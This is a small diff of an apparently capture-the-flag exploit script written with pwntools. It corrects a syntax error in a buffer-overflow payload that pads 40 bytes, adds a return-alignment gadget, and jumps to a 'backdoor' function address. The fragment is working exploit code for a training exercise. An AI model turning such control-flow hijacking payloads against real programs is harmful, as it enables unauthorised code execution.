@@ -12,7 +12,7 @@ log.info(f"Target: {hex(backdoor)}")
 log.info(f"Alignment Gadget: {hex(ret_gadget)}")
 
 payload = b"A" * 40
-payload += p64()ret_gadget
+payload += p64(ret_gadget)
 payload += p64(backdoor)
 
 io.sendlineafter(b"developers:", payload)
